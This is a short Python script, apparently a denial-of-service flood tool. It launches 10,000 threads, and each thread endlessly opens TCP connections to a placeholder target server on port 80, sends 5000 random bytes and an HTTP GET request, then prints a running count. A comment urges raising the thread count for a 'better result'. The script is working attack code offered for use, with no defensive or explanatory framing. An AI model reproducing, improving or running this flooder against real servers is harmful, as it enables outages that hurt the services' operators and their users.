import socket
import threading
import random
target = 'ip of the server' 

port = 80
num = 0

def run():
    while True:
        bytes = random._urandom(5000)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect((target, port))
        s.sendto(bytes, (target,port))
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"

        s.sendall(request.encode('ascii'))

        global num
        num += 1
        print(num)



for i in range(10000): #instead of 10000 you can adjust(bigger nr better reslut
    thread = threading.Thread(target=run)
    thread.start()
